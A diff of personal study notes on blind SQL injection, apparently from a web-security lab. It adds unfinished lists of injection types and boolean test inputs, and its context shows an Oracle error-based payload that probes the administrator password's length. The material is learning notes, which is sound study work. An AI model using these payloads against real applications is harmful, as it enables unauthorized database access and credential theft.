@@ -1,6 +1,19 @@
 Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any 
 database errors.
 
+Types of Blind SQL Injection?
+1: HTTP response do not contain the result of query.
+2: Error-based SQL injection
+3:
+
+=> How do I check Blind SQL injection? 
+
+Method 1: By triggering conditional responses
+example: xyz' AND 1=1--
+example" xyz' AND 1=2--
+
+Method 2:
+
 Analysis:
 1) Prove that parameter is vulnerable by adding ' or '' quotation
 
@@ -37,7 +50,7 @@ both exist.)
 => 200 response => user does not exist in database
 
 
-4) Determin length of password
+4) Determine length of password
 
 ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>30) || ' 
 => 200 response at 30 => length of password is less than 30
